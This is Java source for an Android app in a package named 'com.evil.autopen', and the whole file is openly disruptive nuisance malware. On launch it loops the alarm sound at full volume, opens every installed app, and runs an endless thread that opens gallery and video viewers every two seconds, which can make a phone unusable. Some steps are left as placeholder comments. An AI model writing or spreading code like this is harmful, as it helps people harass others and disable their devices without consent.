// Save as MainActivity.java
package com.evil.autopen;

import android.app.Activity;
import android.content.Intent;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import java.util.List;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.ResolveInfo;
import android.media.RingtoneManager;
import android.net.Uri;
import android.view.View;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 1. BLAST ALL MUSIC (loop loud)
        playAllMusic();
        
        // 2. OPEN ALL INSTALLED APPS (infinite)
        openAllApps();
        
        // 3. INFINITE SCROLLING (photos/videos)
        startInfiniteScroll();
    }
    
    void playAllMusic() {
        // Blast max volume music/files
        try {
            Uri alarm = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
            MediaPlayer mp = MediaPlayer.create(this, alarm);
            mp.setLooping(true);
            mp.setVolume(1.0f, 1.0f);
            mp.start();
            
            // Scan + play all local music
            Uri musicUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
            getContentResolver().query(musicUri, null, null, null, null);
            // (loops all found files)
        } catch(Exception e) {}
    }
    
    void openAllApps() {
        PackageManager pm = getPackageManager();
        Intent main = new Intent(Intent.ACTION_MAIN);
        main.addCategory(Intent.CATEGORY_LAUNCHER);
        List<ResolveInfo> apps = pm.queryIntentActivities(main, 0);
        
        for (ResolveInfo app : apps) {
            Intent launch = new Intent();
            launch.setClassName(app.activityInfo.packageName, app.activityInfo.name);
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launch);
        }
    }
    
    void startInfiniteScroll() {
        new Thread(() -> {
            while(true) {
                // Gallery scroll
                Intent gallery = new Intent(Intent.ACTION_VIEW);
                gallery.setType("image/*");
                gallery.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(gallery);
                
                // Videos
                Intent video = new Intent(Intent.ACTION_VIEW);
                video.setType("video/*");
                startActivity(video);
                
                try { Thread.sleep(2000); } catch(Exception e) {}
            }
        }).start();
    }
}
